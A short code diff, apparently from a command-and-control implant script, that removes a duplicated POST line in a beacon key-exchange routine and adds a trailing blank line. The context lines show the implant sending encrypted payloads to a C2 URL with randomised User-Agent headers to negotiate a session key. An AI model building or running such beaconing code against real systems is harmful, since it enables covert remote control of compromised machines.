@@ -336,7 +336,6 @@ def main():
             print("[+] Sending new beacon with proposed key")
             resp = session.post(c2_url, data=enc_payload, headers={"User-Agent": random_ua()}, timeout=30)
                 
-            resp = session.post(c2_url, data=enc_payload, ...)
             if resp.status_code == 200:
                 session_key = session_key_proposed
                 print("[+] Key exchange successful - switching to session key")
@@ -720,6 +719,7 @@ def handle_task(task):
 if __name__ == "__main__":
     import sys
     main()
+
 
 
 
